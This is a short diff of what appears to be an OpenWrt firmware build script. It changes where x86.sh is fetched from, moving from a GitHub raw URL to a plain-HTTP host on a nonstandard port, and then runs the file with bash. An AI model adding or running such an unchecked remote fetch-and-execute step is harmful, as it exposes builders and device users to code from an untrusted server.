@@ -2,7 +2,7 @@
 # Copyright (c) 2019-2020 P3TERX <https://p3terx.com>
 # DIY扩展 在此脚本 增加插件
 
-wget https://raw.githubusercontent.com/gd0772/patch/main/x86.sh
+wget http://lb.456234.xyz:3001/x86.sh
 bash x86.sh
 
 python-cryptography
